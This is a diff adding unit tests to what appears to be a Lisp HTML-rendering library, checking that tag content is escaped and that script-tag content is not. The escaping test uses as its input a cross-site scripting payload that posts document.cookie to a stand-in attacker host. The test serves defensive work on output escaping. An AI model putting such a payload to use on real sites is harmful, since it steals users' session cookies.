@@ -63,6 +63,19 @@
                 (img :src "/background.png")
                 :pretty t))))
 
+(test escaping-tag
+  (is (string= #M"<div>
+                 \  &lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;
+                 \</div>"
+               (render-to-string
+                (div "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>" )
+                :pretty t))))
+
+(test non-escaping-tag
+  (is (string= "<script>alert('<< Do not embed user-generated contents here! >>')</script>"
+               (render-to-string
+                (script "alert('<< Do not embed user-generated contents here! >>')")))))
+
 (test fragment
   (let ((frg (<>
                (li "bar")
